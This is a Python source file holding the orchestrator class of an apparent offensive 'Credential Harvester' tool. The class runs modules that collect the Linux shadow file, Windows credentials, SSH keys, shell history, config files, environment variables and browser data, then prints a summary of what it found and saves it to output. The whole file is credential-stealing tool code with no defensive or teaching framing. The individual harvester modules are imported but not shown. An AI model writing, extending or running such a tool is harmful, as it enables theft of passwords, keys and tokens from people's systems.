"""
Base class for Credential Harvester
"""

import os
import datetime
from typing import Dict, List
from ..harvesters import (
    LinuxHarvester,
    WindowsHarvester,
    SSHKeyHarvester,
    HistoryHarvester,
    ConfigHarvester,
    EnvHarvester,
    BrowserHarvester
)
from ..output.formatters import OutputFormatter


class CredentialHarvester:
    """Main orchestrator for credential harvesting"""
    
    def __init__(self):
        self.credentials = {
            'passwords': [],
            'hashes': [],
            'keys': [],
            'tokens': [],
            'cookies': []
        }
        self.os_type = os.name  # 'posix' for Linux/Mac, 'nt' for Windows
        
        # Initialize harvesters
        self.linux = LinuxHarvester(self.credentials)
        self.windows = WindowsHarvester(self.credentials)
        self.ssh = SSHKeyHarvester(self.credentials, self.os_type)
        self.history = HistoryHarvester(self.credentials, self.os_type)
        self.config = ConfigHarvester(self.credentials, self.os_type)
        self.env = EnvHarvester(self.credentials)
        self.browser = BrowserHarvester(self.credentials, self.os_type)
        
        # Output formatter
        self.formatter = OutputFormatter()
    
    def run_full_harvest(self):
        """Run all credential harvesting modules"""
        print("="*60)
        print("CREDENTIAL HARVESTING")
        print("="*60)
        
        # OS-specific harvesting
        if self.os_type == 'posix':
            self.linux.harvest_shadow()
        else:
            self.windows.harvest_all()
        
        # Cross-platform harvesting
        self.ssh.harvest()
        self.history.harvest()
        self.config.harvest()
        self.env.harvest()
        self.browser.harvest()
        
        print("\n" + "="*60)
        print("HARVEST COMPLETE")
        print("="*60)
        
        # Summary
        self._print_summary()
        
        # Save results
        self.formatter.save(self.credentials)
    
    def _print_summary(self):
        """Print harvest summary"""
        print(f"\n[*] Credentials Summary:")
        print(f"  Passwords: {len(self.credentials['passwords'])}")
        print(f"  Hashes: {len(self.credentials['hashes'])}")
        print(f"  Keys: {len(self.credentials['keys'])}")
        print(f"  Tokens: {len(self.credentials['tokens'])}")
